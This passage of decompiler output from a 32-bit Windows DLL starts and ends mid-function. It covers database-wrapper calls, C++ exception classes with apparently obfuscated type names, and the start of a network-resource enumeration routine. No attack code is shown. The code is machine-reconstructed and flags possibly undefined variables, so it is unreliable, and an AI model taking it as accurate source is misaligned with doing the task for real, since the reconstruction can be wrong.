  int v11; // [esp-8h] [ebp-234h] BYREF
  int v12; // [esp-4h] [ebp-230h]
  char v13[116]; // [esp+10h] [ebp-21Ch] BYREF
  int v14[5]; // [esp+84h] [ebp-1A8h] BYREF
  _DWORD v15[9]; // [esp+98h] [ebp-194h] BYREF
  _DWORD v16[9]; // [esp+BCh] [ebp-170h] BYREF
  int v17; // [esp+E0h] [ebp-14Ch]
  int v18; // [esp+E4h] [ebp-148h]
  _DWORD *v19; // [esp+E8h] [ebp-144h] BYREF
  void *v20; // [esp+ECh] [ebp-140h]
  _DWORD v21[78]; // [esp+F0h] [ebp-13Ch] BYREF
  int v22; // [esp+228h] [ebp-4h]

  v18 = a3;
  v17 = a4;
  v22 = 0;
  if ( a5 || (sub_1000A219(&a5, dword_1017DB58), a5) )
  {
    LOBYTE(v22) = 1;
    sub_1001AC1E((int)v15);
    LOBYTE(v22) = 2;
    sub_100528AC(v21);
    LOBYTE(v22) = 3;
    sub_10052AB7(v15, (int)v13, (int)v21);
    LOBYTE(v22) = 4;
    sub_1001A969(v13, v16, 0);
    LOBYTE(v22) = 5;
    sub_1000ED72((int)(this + 2), &v19);
    LOBYTE(v22) = 6;
    sub_1001AA80(v16, this[1]++);
    LOBYTE(v22) = 5;
    sub_1000EDA4(&v19);
    v7 = sub_1001C764();
    sub_1001AA80(v16, v7);
    sub_1001AA80(v16, a2);
    sub_1001AA35(v16, 6);
    v12 = v8;
    v11 = v8;
    v20 = &v11;
    sub_1000D372(&v11, v18);
    LOBYTE(v22) = 5;
    sub_1001AAB4(v16, v11, v12);
    v12 = v9;
    v11 = v9;
    v20 = &v11;
    sub_1000D372(&v11, v17);
    LOBYTE(v22) = 5;
    sub_1001AAB4(v16, v11, v12);
    v10 = sub_1001AD84(v15, (int)v14);
    LOBYTE(v22) = 9;
    (*(void (__thiscall **)(int, int, int))(*(_DWORD *)a5 + 4))(a5, v10, 106);
    LOBYTE(v22) = 5;
    sub_1000B3DF(v14);
    LOBYTE(v22) = 4;
    sub_1001A9CE((int)v16);
    LOBYTE(v22) = 3;
    sub_10052BF8((int)v13);
    LOBYTE(v22) = 2;
    sub_1004F436(v21);
    LOBYTE(v22) = 1;
    sub_1001AC89((int)v15);
    v22 = 0;
  }
  v22 = -1;
  sub_1000780D(&a5);
  sub_1009FFCE();
}
// 1004FDCD: variable 'v8' is possibly undefined
// 1004FDF6: variable 'v9' is possibly undefined
// 1017DB58: using guessed type _DWORD dword_1017DB58[2];
// 1004FCD8: using guessed type _DWORD var_194[9];
// 1004FCD8: using guessed type _DWORD var_13C[78];
// 1004FCD8: using guessed type _DWORD var_170[9];
// 1004FCD8: using guessed type int var_1A8[5];

//----- (1004FEAE) --------------------------------------------------------
int __fastcall sub_1004FEAE(int a1, int a2, int a3, char a4)
{
  int result; // eax
  char v5; // dl
  _DWORD *v6; // eax

  result = a3;
  *(_DWORD *)(a3 + 12) = a2;
  v5 = a4;
  *(_DWORD *)a3 = off_10104468;
  *(_BYTE *)(a3 + 4) = 0;
  *(_DWORD *)(a3 + 8) = a1;
  *(_BYTE *)(a3 + 16) = v5;
  if ( !a1 )
  {
    v6 = sub_1000E7F7(&a4, 1, 0);
    sub_10007882((int)v6);
  }
  return result;
}
// 10104468: using guessed type int (__thiscall *off_10104468[4])(void *Block, char);

//----- (1004FEFA) --------------------------------------------------------
_DWORD *__thiscall sub_1004FEFA(_DWORD *Block, char a2)
{
  sub_1004FF19(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1004FF19) --------------------------------------------------------
void *__thiscall sub_1004FF19(_DWORD *this)
{
  void *result; // eax
  unsigned int v3; // ebx
  _DWORD v4[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_100AEDC7;
  v4[3] = v4;
  *this = off_10104468;
  v4[6] = 0;
  v3 = this[2];
  if ( v3 )
  {
    result = (void *)sub_10053012(v3);
    this[2] = 0;
  }
  return result;
}
// 10104468: using guessed type int (__thiscall *off_10104468[4])(void *Block, char);

//----- (1004FF63) --------------------------------------------------------
int __thiscall sub_1004FF63(int this, int a2)
{
  const struct Concurrency::SchedulerPolicy *v3; // eax
  int result; // eax
  _DWORD *v5; // eax
  _DWORD *v6; // eax
  int v7; // eax
  int v8; // [esp+0h] [ebp-48h] BYREF
  int v9[4]; // [esp+Ch] [ebp-3Ch] BYREF
  int v10[4]; // [esp+1Ch] [ebp-2Ch] BYREF
  _DWORD v11[3]; // [esp+30h] [ebp-18h] BYREF
  int v12; // [esp+44h] [ebp-4h]

  v11[2] = &v8;
  v11[1] = this;
  if ( *(_BYTE *)(this + 16) && sub_10050A9E(*(_DWORD *)(this + 12), 0) )
  {
    v3 = (const struct Concurrency::SchedulerPolicy *)sub_1004548C(&a2);
    v12 = 0;
    goto LABEL_4;
  }
  result = sub_1005326B(*(_DWORD *)(this + 8));
  if ( result == 5 )
  {
    if ( (_BYTE)a2 )
    {
      v6 = sub_10053676(v9, *(_DWORD *)(this + 12), 5);
      v12 = 1;
      sub_100501AF((int)v6, 64);
    }
    a2 = 1;
    v12 = 2;
    sub_10053046(*(_DWORD *)(this + 8));
    v7 = sub_1000E70F(0x64u);
    if ( sub_10050A9E(*(_DWORD *)(this + 12), v7 + 100) )
    {
      v3 = (const struct Concurrency::SchedulerPolicy *)sub_1004548C(v11);
      LOBYTE(v12) = 3;
LABEL_4:
      sub_100470BB(v3);
    }
    return sub_1004FF63(1);
  }
  else if ( result != 100 )
  {
    if ( result == 101 )
    {
      *(_BYTE *)(this + 4) = 1;
    }
    else if ( result )
    {
      v5 = sub_10053676(v10, *(_DWORD *)(this + 12), result);
      v12 = 5;
      sub_100501AF((int)v5, 95);
    }
  }
  return result;
}
// 10050016: conditional instruction was optimized away because %arg_0.4==1
// 1004FF63: using guessed type int var_2C[4];
// 1004FF63: using guessed type int var_3C[4];

//----- (10050089) --------------------------------------------------------
int __thiscall sub_10050089(int **this, int a2)
{
  int result; // eax
  _DWORD *v3; // eax
  _DWORD pExceptionObject[6]; // [esp+0h] [ebp-3Ch] BYREF
  _DWORD v5[9]; // [esp+18h] [ebp-24h] BYREF

  result = sub_10053451(0, this[2]);
  if ( result != a2 )
  {
    v3 = sub_100537CF(v5, a2, result);
    v5[8] = 0;
    sub_10050220(pExceptionObject, (int)v3);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVVvetnzciTojzivXvqvVetnzcito_egjpve_eu_sr__);
  }
  return result;
}
// 10050089: using guessed type _DWORD pExceptionObject[6];

//----- (100500E2) --------------------------------------------------------
int __usercall sub_100500E2@<eax>(int **a1@<eax>)
{
  int *v2; // edi
  _DWORD *v3; // eax
  int v4; // esi

  sub_10050089(a1, 1);
  v2 = a1[2];
  v3 = sub_100533C0(0, (_DWORD **)v2);
  v4 = sub_1005A03A((int)v3);
  sub_10053411(v2);
  return v4;
}

//----- (1005011E) --------------------------------------------------------
void *__thiscall sub_1005011E(int **this, void *a2)
{
  int *v3; // edi
  _DWORD *v4; // eax
  int *v5; // esi
  _DWORD *v6; // eax
  void *v7; // ebx
  void *v9; // [esp+14h] [ebp-10h]

  sub_10050089(this, 4);
  v3 = this[2];
  v4 = sub_100533C0(0, (_DWORD **)v3);
  v9 = (void *)sub_1005AA64((int)v4);
  sub_10053411(v3);
  if ( v9 )
  {
    v5 = this[2];
    v6 = sub_100533C0(0, (_DWORD **)v5);
    v7 = (void *)sub_100530A3((int)v6);
    sub_10053411(v5);
    sub_1000B1F3(v9, (int)a2, v7);
  }
  else
  {
    sub_1000B1F3(0, (int)a2, 0);
  }
  return a2;
}

//----- (100501AF) --------------------------------------------------------
void __cdecl __noreturn sub_100501AF(int a1, int a2)
{
  _DWORD pExceptionObject[4]; // [esp+0h] [ebp-10h] BYREF

  sub_100501D2(pExceptionObject, a1);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVWFUlscSjzvhwbsf_egjpve_eu_sr__);
}
// 100501AF: using guessed type _DWORD pExceptionObject[4];

//----- (100501D2) --------------------------------------------------------
_DWORD *__thiscall sub_100501D2(_DWORD *this, int a2)
{
  sub_1000E7B3(this, a2);
  *this = &off_10104460;
  this[1] = *(_DWORD *)(a2 + 4);
  sub_1000D372(this + 2, a2 + 8);
  return this;
}
// 10104460: using guessed type int (__thiscall *off_10104460)(void *Block, char);

//----- (10050220) --------------------------------------------------------
_DWORD *__thiscall sub_10050220(_DWORD *this, int a2)
{
  sub_100501D2(this, a2);
  *this = &off_1010447C;
  this[4] = *(_DWORD *)(a2 + 16);
  this[5] = *(_DWORD *)(a2 + 20);
  return this;
}
// 1010447C: using guessed type int (__thiscall *off_1010447C)(void *Block, char);

//----- (10050267) --------------------------------------------------------
int *__thiscall sub_10050267(int *Block, char a2)
{
  sub_10053794(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10050286) --------------------------------------------------------
void __stdcall sub_10050286(int a1, int a2, unsigned int a3, int a4, char a5)
{
  char *v5; // esi
  char *v6; // eax
  int v7; // eax
  _DWORD *v8; // eax
  wchar_t *v9; // eax
  int *v10; // eax
  unsigned int v11; // esi
  int v12; // edi
  _DWORD *v13; // esi
  wchar_t *v14; // eax
  unsigned __int8 *v15; // eax
  wchar_t *v16; // eax
  int v17; // [esp+0h] [ebp-3Ch] BYREF
  int v18; // [esp+10h] [ebp-2Ch] BYREF
  int v19[2]; // [esp+18h] [ebp-24h] BYREF
  int v20[2]; // [esp+20h] [ebp-1Ch] BYREF
  int v21; // [esp+28h] [ebp-14h]
  int *v22; // [esp+2Ch] [ebp-10h]
  int v23; // [esp+38h] [ebp-4h]

  v22 = &v17;
  sub_10050BD5((int)&a4 + 3);
  v23 = 0;
  v21 = ((_BYTE)a4 != 0) + 5;
  v5 = (char *)dword_1017DB60;
  v6 = (char *)sub_1000D3DA(a2);
  v7 = sub_1005443F(a2, (int)v5, v6, (_DWORD *)(a1 + 4), v21, v5);
  if ( v7 )
  {
    v8 = sub_100536F1(&v18, v7);
    LOBYTE(v23) = 1;
    sub_100501AF((int)v8, 43);
  }
  sub_10050485(a1);
  v9 = (wchar_t *)sub_1000CC40((int)&unk_10130590);
  sub_1000D17D(v20, v9);
  LOBYTE(v23) = 2;
  v10 = sub_100507F4(a1, v19, (unsigned __int8 *)v20);
  LOBYTE(v23) = 3;
  v11 = sub_100500E2((int **)*v10);
  LOBYTE(v23) = 2;
  sub_1003406C((void **)v19);
  LOBYTE(v23) = 0;
  sub_1000D3AD(v20);
  v12 = a3 / v11;
  if ( a3 )
  {
    if ( a3 < v11 )
      v12 = 1;
  }
  else
  {
    v12 = 50000;
  }
  v13 = sub_1000D17D(v19, &word_101305D8);
  LOBYTE(v23) = 4;
  v14 = (wchar_t *)sub_1000CC40((int)&unk_101305E0);
  v15 = (unsigned __int8 *)sub_1000D6C3((int)v13, v14, v12);
  sub_100506BD(a1, v15);
  LOBYTE(v23) = 0;
  sub_1000D3AD(v19);
  if ( a5 )
  {
    v16 = (wchar_t *)sub_1000CC40((int)&unk_10130638);
    sub_1000D17D(v20, v16);
    LOBYTE(v23) = 5;
    sub_100506BD(a1, (unsigned __int8 *)v20);
    LOBYTE(v23) = 0;
    sub_1000D3AD(v20);
  }
}
// 1017DB60: using guessed type int dword_1017DB60;

//----- (100503FE) --------------------------------------------------------
void *__thiscall sub_100503FE(void *Block, char a2)
{
  sub_1005041D((int)Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1005041D) --------------------------------------------------------
void __thiscall sub_1005041D(int this)
{
  _DWORD v2[5]; // [esp+0h] [ebp-20h] BYREF
  int v3; // [esp+1Ch] [ebp-4h]

  v2[4] = v2;
  v2[3] = this;
  *(_DWORD *)this = off_10104470;
  v3 = 2;
  sub_100509C8(this);
  v3 = 0;
  sub_1003406C((void **)(this + 20));
  v3 = -1;
  sub_1000D3AD((int *)(this + 12));
}
// 10104470: using guessed type int (__thiscall *off_10104470[2])(void *Block, char);

//----- (10050485) --------------------------------------------------------
int __usercall sub_10050485@<eax>(int a1@<edi>)
{
  int v1; // eax
  _DWORD *v2; // eax
  int *v3; // esi
  int v5; // [esp+0h] [ebp-2Ch]
  _DWORD v6[8]; // [esp+Ch] [ebp-20h] BYREF

  v1 = sub_10053FE4(*(int **)(a1 + 4), v5);
  if ( v1 )
  {
    v2 = sub_10053676(v6, a1, v1);
    v6[7] = 0;
    sub_100501AF((int)v2, 123);
  }
  v3 = *(int **)(a1 + 4);
  sub_10061305(v3[17]);
  v3[62] = 0;
  v3[64] = 0;
  v3[63] = 0;
  return sub_10061317(v3[17]);
}
// 100504A8: variable 'v5' is possibly undefined

//----- (10050505) --------------------------------------------------------
_DWORD *__userpurge sub_10050505@<eax>(int a1@<ebx>, _DWORD *a2, unsigned __int8 *a3, _DWORD *a4, char *Block)
{
  const struct Concurrency::SchedulerPolicy *v5; // eax
  size_t v6; // eax
  unsigned __int8 *v7; // esi
  _DWORD *v8; // edi
  int v9; // eax
  _DWORD *v10; // eax
  bool v11; // zf
  size_t v12; // eax
  int v13; // eax
  char *v14; // eax
  int v15; // eax
  char pExceptionObject[28]; // [esp+8h] [ebp-60h] BYREF
  char v18[12]; // [esp+24h] [ebp-44h] BYREF
  int v19[4]; // [esp+30h] [ebp-38h] BYREF
  int v20[2]; // [esp+40h] [ebp-28h] BYREF
  int v21; // [esp+48h] [ebp-20h] BYREF
  int v22; // [esp+4Ch] [ebp-1Ch]
  int v23; // [esp+50h] [ebp-18h]
  int v24; // [esp+54h] [ebp-14h] BYREF
  int v25; // [esp+64h] [ebp-4h]

  v23 = 0;
  if ( *(_BYTE *)(a1 + 8) && sub_10050A9E(a1, 0) )
  {
    v5 = (const struct Concurrency::SchedulerPolicy *)sub_1004548C(&Block);
    v25 = 1;
    sub_100470BB(v5);
  }
  GetCurrentProcessId();
  GetCurrentProcessId();
  v20[0] = (int)off_1010446C;
  v20[1] = 0;
  v25 = 4;
  sub_1000D836(-2, (int)a3, &v21, (unsigned int)Block);
  LOBYTE(v25) = 5;
  v6 = sub_1000D687((int)&v21);
  v8 = *(_DWORD **)(a1 + 4);
  a3 = *(unsigned __int8 **)(v22 + 12);
  v7 = a3;
  v9 = sub_10058911(v8, a3, 2 * v6 + 2, (unsigned int *)&v24, &a3);
  if ( v9 )
  {
    v10 = sub_10053676(v19, a1, v9);
    LOBYTE(v25) = 6;
    sub_100501AF((int)v10, 152);
  }
  v11 = v24 == 0;
  *a4 = &Block[(int)&a3[-*(_DWORD *)(v22 + 12)] >> 1];
  if ( v11 )
  {
    v12 = sub_1000D687((int)&v21);
    LOBYTE(Block) = a3 >= &v7[2 * v12];
    v13 = sub_10053811((int)v18, (int)&v21, (char)Block);
    LOBYTE(v25) = 7;
    sub_10050C29((int)pExceptionObject, v13);
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVUifutMbjzonqvbHkjmguifu_egjpve_eu_sr__);
  }
  v14 = (char *)operator new(0x14u);
  Block = v14;
  LOBYTE(v25) = 8;
  if ( v14 )
    v15 = sub_1004FEAE(v24, a1, (int)v14, *(_BYTE *)(a1 + 8));
  else
    v15 = 0;
  LOBYTE(v25) = 5;
  sub_10050B91(a2, v15);
  v23 = 1;
  LOBYTE(v25) = 4;
  sub_1000D3AD(&v21);
  LOBYTE(v25) = 0;
  sub_10050B52(v20);
  return a2;
}
// 1010446C: using guessed type int (__thiscall *off_1010446C[3])(void *Block, char);
// 10050505: using guessed type int var_38[4];
// 10050505: using guessed type char var_44[12];

//----- (10050688) --------------------------------------------------------
void __thiscall sub_10050688(int *this)
{
  sub_1000D3AD(this + 4);
  sub_10053794(this);
}

//----- (100506BD) --------------------------------------------------------
__int64 __stdcall sub_100506BD(int a1, unsigned __int8 *a2)
{
  char *i; // esi
  int v4; // [esp+0h] [ebp-30h] BYREF
  int v5[2]; // [esp+10h] [ebp-20h] BYREF
  int v6[3]; // [esp+18h] [ebp-18h] BYREF
  int v7; // [esp+2Ch] [ebp-4h]

  v6[2] = (int)&v4;
  for ( i = 0; (unsigned int)i < sub_1000D687((int)a2); i = (char *)v6[0] )
  {
    v6[0] = (int)i;
    v7 = 0;
    sub_10050505(a1, v5, a2, v6, i);
    LOBYTE(v7) = 1;
    sub_1004FF63(v5[0], 0);
    LOBYTE(v7) = 0;
    sub_1003406C((void **)v5);
    v7 = -1;
  }
  return *(_QWORD *)(*(_DWORD *)(a1 + 4) + 48);
}

//----- (10050743) --------------------------------------------------------
__int64 __stdcall sub_10050743(int a1, unsigned __int8 *a2, void *a3)
{
  char *i; // esi
  int v5; // [esp-8h] [ebp-3Ch] BYREF
  volatile LONG *v6; // [esp-4h] [ebp-38h]
  int v7; // [esp+0h] [ebp-34h] BYREF
  int v8; // [esp+14h] [ebp-20h] BYREF
  volatile LONG *v9; // [esp+18h] [ebp-1Ch]
  int *v10; // [esp+1Ch] [ebp-18h]
  int v11[2]; // [esp+20h] [ebp-14h] BYREF
  int v12; // [esp+30h] [ebp-4h]

  v11[1] = (int)&v7;
  for ( i = 0; (unsigned int)i < sub_1000D687((int)a2); i = (char *)v11[0] )
  {
    v11[0] = (int)i;
    v12 = 0;
    sub_10050505(a1, &v8, a2, v11, i);
    LOBYTE(v12) = 1;
    v10 = &v5;
    v6 = v9;
    v5 = v8;
    InterlockedIncrement(v9);
    LOBYTE(v12) = 1;
    sub_100508B5(a3, v5, (int)v6);
    sub_1004FF63(v8, 0);
    LOBYTE(v12) = 0;
    sub_1003406C((void **)&v8);
    v12 = -1;
  }
  return *(_QWORD *)(*(_DWORD *)(a1 + 4) + 48);
}

//----- (100507F4) --------------------------------------------------------
int *__userpurge sub_100507F4@<eax>(int a1@<ebx>, int *a2, unsigned __int8 *a3)
{
  sub_10050505(a1, a2, a3, &a3, 0);
  sub_1004FF63(*a2, 0);
  return a2;
}

//----- (1005083E) --------------------------------------------------------
int *__thiscall sub_1005083E(void *this, int *a2, unsigned __int8 *a3, void *a4)
{
  volatile LONG *v4; // ecx
  int v5; // ecx
  volatile LONG *v7; // [esp-8h] [ebp-24h] BYREF
  volatile LONG *v8; // [esp-4h] [ebp-20h]
  int v9; // [esp+Ch] [ebp-10h]
  int v10; // [esp+18h] [ebp-4h]

  v9 = 0;
  sub_10050505((int)this, a2, a3, &a3, 0);
  v10 = 0;
  v8 = v4;
  v7 = v4;
  v8 = (volatile LONG *)a2[1];
  v5 = *a2;
  a3 = (unsigned __int8 *)&v7;
  v9 = 1;
  v7 = (volatile LONG *)v5;
  InterlockedIncrement(v8);
  v10 = 0;
  sub_100508B5(a4, (int)v7, (int)v8);
  sub_1004FF63(*a2, 0);
  return a2;
}
// 1005086C: variable 'v4' is possibly undefined

//----- (100508B5) --------------------------------------------------------
void __thiscall sub_100508B5(void *this, int a2, int a3)
{
  int v3; // ebx
  int v4; // esi
  _DWORD *v5; // eax
  _BYTE *v6; // eax
  int v7; // esi
  wchar_t *v8; // eax
  int v9; // ecx
  int v10[5]; // [esp-8h] [ebp-58h] BYREF
  _DWORD pExceptionObject[5]; // [esp+Ch] [ebp-44h] BYREF
  int v12[5]; // [esp+20h] [ebp-30h] BYREF
  void *v13[4]; // [esp+34h] [ebp-1Ch] BYREF
  int v14; // [esp+4Ch] [ebp-4h]

  v14 = 0;
  (*(void (__thiscall **)(void *, void **))(*(_DWORD *)this + 8))(this, v13);
  LOBYTE(v14) = 1;
  v3 = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(void *))(*(_DWORD *)v13[0] + 4))(v13[0]) )
  {
    v4 = *(_DWORD *)((*(int (__thiscall **)(void *))(*(_DWORD *)v13[0] + 12))(v13[0]) + 12);
    v5 = (_DWORD *)(*(int (__thiscall **)(void *))(*(_DWORD *)v13[0] + 12))(v13[0]);
    v6 = (_BYTE *)sub_1000B4B8(v5);
    v7 = sub_10053580(v3, *(_DWORD ***)(a2 + 8), v6, v4);
    if ( v7 )
    {
      v8 = (wchar_t *)sub_1000CC40((int)&unk_101304C8);
      v10[0] = v9;
      v13[2] = v10;
      sub_1000D17D(v10, v8);
      LOBYTE(v14) = 1;
      sub_1005373D(v12, v7, v10[0], v10[1]);
      v12[0] = (int)&off_1010447C;
      v12[4] = v3;
      LOBYTE(v14) = 4;
      sub_10050C7B(pExceptionObject, (int)v12);
      _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVWpydsrwGEZPpowwpydsrWgezppoww_egjpve_eu_sr__);
    }
    ++v3;
    sub_10042AAB((int)v13[0]);
  }
  LOBYTE(v14) = 0;
  sub_1003406C(v13);
  v14 = -1;
  sub_1003406C((void **)&a2);
}
// 10050954: variable 'v9' is possibly undefined
// 1010447C: using guessed type int (__thiscall *off_1010447C)(void *Block, char);
// 100508B5: using guessed type _DWORD pExceptionObject[5];

//----- (100509A5) --------------------------------------------------------
void __thiscall sub_100509A5(int *this)
{
  sub_10053794(this);
}

//----- (100509C8) --------------------------------------------------------
int __usercall sub_100509C8@<eax>(int a1@<esi>)
{
  int result; // eax
  _DWORD *v2; // eax
  _DWORD v3[8]; // [esp+0h] [ebp-20h] BYREF

  result = *(_DWORD *)(a1 + 4);
  if ( result )
  {
    result = sub_10053D2E(result);
    if ( result )
    {
      v2 = sub_10053676(v3, a1, result);
      v3[7] = 0;
      sub_100501AF((int)v2, 262);
    }
    *(_DWORD *)(a1 + 4) = 0;
  }
  return result;
}

//----- (10050A25) --------------------------------------------------------
_DWORD *__stdcall sub_10050A25(int a1, _DWORD *a2)
{
  wchar_t *v2; // eax

  v2 = (wchar_t *)sub_1005428D(*(_DWORD *)(a1 + 4));
  sub_1000D17D(a2, v2);
  return a2;
}

//----- (10050A67) --------------------------------------------------------
BOOL __cdecl sub_10050A67(int a1, int a2)
{
  return a2 < 480 && !sub_10050A9E(a1, 250) && sub_10014AF7(a1 + 12);
}

//----- (10050A9E) --------------------------------------------------------
char __stdcall sub_10050A9E(int a1, int a2)
{
  _DWORD *v2; // eax
  char v3; // bl
  int v5[3]; // [esp+8h] [ebp-18h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v2 = sub_1001EA28(*(_DWORD *)(a1 + 20), v5, a2, 0, 0);
  v6 = 0;
  v3 = (*(int (__thiscall **)(_DWORD *))(*v2 + 4))(v2);
  v6 = -1;
  sub_10012E7E(v5);
  return v3;
}

//----- (10050AEE) --------------------------------------------------------
void *__thiscall sub_10050AEE(_DWORD *this)
{
  void *result; // eax
  int (__thiscall ***v2)(_DWORD, int); // ecx
  _DWORD v3[7]; // [esp+0h] [ebp-1Ch] BYREF

  result = &loc_100A064E;
  v3[3] = v3;
  *this = off_10104484;
  v3[6] = 0;
  v2 = (int (__thiscall ***)(_DWORD, int))this[1];
  if ( v2 )
    return (void *)(**v2)(v2, 1);
  return result;
}
// 10104484: using guessed type int (__thiscall *off_10104484[3])(void *Block, char);

//----- (10050B33) --------------------------------------------------------
_DWORD *__thiscall sub_10050B33(_DWORD *Block, char a2)
{
  sub_10050AEE(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10050B52) --------------------------------------------------------
char __thiscall sub_10050B52(_DWORD *this)
{
  _DWORD v2[7]; // [esp+0h] [ebp-1Ch] BYREF

  v2[3] = v2;
  *this = off_1010446C;
  v2[6] = 0;
  return sub_10050CFA((int)this);
}
// 1010446C: using guessed type int (__thiscall *off_1010446C[3])(void *Block, char);

//----- (10050B91) --------------------------------------------------------
_DWORD *__userpurge sub_10050B91@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (10050BD5) --------------------------------------------------------
int __stdcall sub_10050BD5(int a1)
{
  sub_10050D14();
  return a1;
}

//----- (10050BEC) --------------------------------------------------------
_DWORD *__thiscall sub_10050BEC(_DWORD *Block, char a2)
{
  sub_10050B52(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10050C0B) --------------------------------------------------------
char *__usercall sub_10050C0B@<eax>(char *a1@<eax>)
{
  char *v1; // esi

  v1 = a1 - 4;
  `eh vector destructor iterator'(a1, 8u, *((_DWORD *)a1 - 1), sub_10020B81);
  j__free(v1);
  return v1;
}

//----- (10050C29) --------------------------------------------------------
int __thiscall sub_10050C29(int this, int a2)
{
  sub_100501D2((_DWORD *)this, a2);
  *(_DWORD *)this = &off_10104474;
  sub_1000D372((_DWORD *)(this + 16), a2 + 16);
  *(_BYTE *)(this + 24) = *(_BYTE *)(a2 + 24);
  return this;
}
// 10104474: using guessed type int (__thiscall *off_10104474)(void *Block, char);

//----- (10050C7B) --------------------------------------------------------
_DWORD *__thiscall sub_10050C7B(_DWORD *this, int a2)
{
  sub_100501D2(this, a2);
  *this = &off_1010447C;
  this[4] = *(_DWORD *)(a2 + 16);
  return this;
}
// 1010447C: using guessed type int (__thiscall *off_1010447C)(void *Block, char);

//----- (10050CBC) --------------------------------------------------------
int *__thiscall sub_10050CBC(int *Block, char a2)
{
  sub_10050688(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10050CDB) --------------------------------------------------------
int *__thiscall sub_10050CDB(int *Block, char a2)
{
  sub_100509A5(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10050CFA) --------------------------------------------------------
char __usercall sub_10050CFA@<al>(int a1@<esi>)
{
  int v1; // eax
  char result; // al

  v1 = *(_DWORD *)(a1 + 4);
  if ( !v1 || v1 == -1 )
    return 1;
  result = sub_10053630(a1);
  *(_DWORD *)(a1 + 4) = 0;
  return result;
}

//----- (10050D14) --------------------------------------------------------
int sub_10050D14()
{
  int v0; // ecx
  int result; // eax
  int *v2; // eax
  int v3; // ecx
  _DWORD *v4[2]; // [esp+4h] [ebp-1Ch] BYREF
  __int32 v5[2]; // [esp+Ch] [ebp-14h] BYREF
  int v6; // [esp+1Ch] [ebp-4h]

  v0 = dword_101831D4;
  result = _InterlockedExchange(v5, (__int32)&loc_100AB66E);
  if ( !v0 )
  {
    sub_1000EDE4(dword_10193D48, v4);
    v6 = 0;
    if ( !dword_101831D4 )
    {
      v2 = (int *)operator new(0x88u);
      v5[0] = (__int32)v2;
      LOBYTE(v6) = 1;
      if ( v2 )
      {
        v2 = sub_100564CF(v2);
        v3 = (int)v2;
      }
      else
      {
        v3 = 0;
      }
      LOBYTE(v6) = 0;
      _InterlockedExchange(v5, (__int32)v2);
      dword_101831D4 = v3;
      dword_10183610 = v3;
    }
    v6 = -1;
    return sub_1000EDA4(v4);
  }
  return result;
}
// 101831D4: using guessed type int dword_101831D4;
// 10183610: using guessed type int dword_10183610;
// 10193D48: using guessed type int dword_10193D48[9];

//----- (10050D97) --------------------------------------------------------
_DWORD *__stdcall sub_10050D97(_DWORD *a1, int a2)
{
  sub_1000E7F7(a1, 1, 0);
  *a1 = &off_10102A68;
  a1[1] = a2;
  return a1;
}
// 10102A68: using guessed type int (__thiscall *off_10102A68)(void *Block, char);

//----- (10050DD5) --------------------------------------------------------
LONG *__userpurge sub_10050DD5@<eax>(int a1@<edi>, LONG *a2)
{
  _DWORD *v2; // eax
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  _DWORD *v5; // eax
  int v7[2]; // [esp+8h] [ebp-14h] BYREF
  int v8; // [esp+18h] [ebp-4h]

  sub_1000D17D(a2 + 4, &word_1013057C);
  v8 = 3;
  sub_1000D17D(a2 + 6, &word_10130580);
  sub_1000D17D(a2 + 8, &word_10130584);
  sub_1000D17D(a2 + 10, &word_10130588);
  *a2 = *(_DWORD *)a1;
  a2[1] = *(_DWORD *)(a1 + 4);
  a2[2] = *(_DWORD *)(a1 + 8);
  a2[3] = *(_DWORD *)(a1 + 12);
  v2 = sub_1005109F(v7, *(wchar_t **)(a1 + 16));
  LOBYTE(v8) = 4;
  sub_10001236(v2 + 1, a2 + 5);
  LOBYTE(v8) = 3;
  sub_1000D3AD(v7);
  v3 = sub_1005109F(v7, *(wchar_t **)(a1 + 20));
  LOBYTE(v8) = 5;
  sub_10001236(v3 + 1, a2 + 7);
  LOBYTE(v8) = 3;
  sub_1000D3AD(v7);
  v4 = sub_1005109F(v7, *(wchar_t **)(a1 + 24));
  LOBYTE(v8) = 6;
  sub_10001236(v4 + 1, a2 + 9);
  LOBYTE(v8) = 3;
  sub_1000D3AD(v7);
  v5 = sub_1005109F(v7, *(wchar_t **)(a1 + 28));
  LOBYTE(v8) = 7;
  sub_10001236(v5 + 1, a2 + 11);
  LOBYTE(v8) = 3;
  sub_1000D3AD(v7);
  return a2;
}

//----- (10050EF6) --------------------------------------------------------
_DWORD *__cdecl sub_10050EF6(_DWORD *a1)
{
  int v1; // ebx
  int v2; // ecx
  void *v3; // eax
  int v4; // edi
  DWORD v5; // ebx
  int v6; // eax
  int v7; // edi
  LONG v9[12]; // [esp+10h] [ebp-74h] BYREF
  int v10[5]; // [esp+40h] [ebp-44h] BYREF
  _DWORD v11[2]; // [esp+54h] [ebp-30h] BYREF
  int (__thiscall **v12)(void *, char); // [esp+5Ch] [ebp-28h] BYREF
  int v13; // [esp+60h] [ebp-24h]
  int v14; // [esp+64h] [ebp-20h]
  int pExceptionObject; // [esp+68h] [ebp-1Ch] BYREF
  DWORD BufferSize; // [esp+6Ch] [ebp-18h] BYREF
  DWORD cCount; // [esp+70h] [ebp-14h] BYREF
  HANDLE hEnum; // [esp+74h] [ebp-10h] BYREF
  int v19; // [esp+80h] [ebp-4h]

  *a1 = off_100FBF5C;
  *a1 = &off_10103750;
  a1[1] = 0;
  a1[2] = 0;
  a1[3] = 0;
  v19 = 0;
  v14 = 1;
  hEnum = 0;
